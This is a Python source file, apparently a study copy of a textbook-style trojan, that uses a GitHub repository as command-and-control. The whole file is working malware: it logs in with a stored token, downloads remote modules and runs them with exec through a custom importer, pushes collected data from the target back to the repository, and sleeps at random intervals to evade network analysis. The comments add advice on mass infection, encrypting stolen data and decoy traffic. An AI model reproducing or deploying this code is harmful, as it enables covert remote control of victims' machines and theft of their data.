#!/usr/bin/python3

import base64
import importlib.util
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

"""
Note: There are a number of improvements you could make to this module. Encrypting all your modules, configuration, and exfiltrated data would be a good start. You'd also
need to automate the process of pulling down data, updating configuration files, and rolling out new trojans if you were going to infect systems on a massive scale. As you
add more functionality, you'll also need to extend how Python loads dynamic and compiled libraries. 
"""

#Reads token.txt and returns a connection to the github repo.
def github_connect():
    with open('token.txt') as f:
        token = f.read()
    tokenStripped = str.strip(token) #Strip newline characters
    user = 'NukeMessiah'
    sess = github3.login(token=tokenStripped)
    return sess.repository(user, 'trojan')

#Receives the directory name, module name, and repo connection and returns to contents of the specified module. This function is responsible 
#for grabbing files from the remote repo and reading the contents in locally. 
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

#Create Trojan class to perform the essential trojaning tasks.
class Trojan:
    #Assign configuration information, the data path where the trojan should write its output files, and make the connection to the repo.
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
    
    ###BEGIN: METHODS TO COMMUNICATE WITH GITHUB AND PUSH ANY DATA COLLECTED FROM THE TARGET MACHINE

    #Retrieves the remote configuration document from the repo so the trojan knows which modules to run.
    def get_config(self): 
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task ['module']) #The call to 'exec' brings the module content into the trojan object.
        return config
    
    def module_runner(self, module):
        result = sys.modules[module].run() #Calls the run() function of the module we just imported with get_config above.
        self.store_module_result(result) 

    #Creates a file whose name includes the current data and time and then saves its output to that file.
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    ###END: METHODS TO COMMUNICATE WITH GITHUB AND PUSH ANY DATA COLLECTED FROM THE TARGET MACHINE

    #Begin running tasks. When the tasks complete, the trojan will sleep for a random amount of time in an attempt to foil any network-pattern analysis.
    #Note: You could also create a bunch of traffic to google.com or any number of other sites that appear benign in an attempt to disguise what the trojan is up to.
    def run(self):
        while True:
            config = self.get_config() #Grab configuration file from repo.
            for task in config: #Kickoff each task module in its own thread.
                thread = threading.Thread(target=self.module_runner, args=(task['module'],)) #Calls module_runner, which calls the module's run() function to begin executing its tasks.
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))


#BEGIN: CREATE CUSTOM IMPORT CLASS
"""
We use Python's 'import' functionality to copy external libraries into our programs so we can use their code. We want to be able to do the same thing for our trojan, but since
we are controlling a remote machine, the packages we want to use may not be available - and there's no easy way to install packages remotely. We also want to make sure that if
we pull in a dependency, such as Scapy, out trojan makes that module available to all of modules that we pull in.

Luckily, Python allows us to customize how it imports modules: If it can't find a module locally, it will call an import class we define, which will allow us to remotely retrieve
the library from our repo by adding our custom import class to the 'sys.meta_path' list.
"""
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None): #Attempts to locate the specified module
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None: #If we find the specified module in our repo,  we base64-decode the code and store it in our class (github will give us base64-encoded data).
            self.current_module_code = base64.b64decode(new_library)
            return self #By returning 'self', we indicate to the Python interpreter that we found the module and that it cancall the load_module method to actually load it.
        
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec) #We use the native 'importlib' module to first create a new blank module object and then load the code we retrieved from github into it.
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module #Insert the newly created module into the sys.modules list so that it's picked up by any future 'import' calls.
        return new_module
#END: CREATE CUSTOM IMPORT CLASS
    
#Put GitImporter into the sys.meta_path list, create the Trojan object, and call its 'run' method.
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('trojanID001')
    trojan.run()

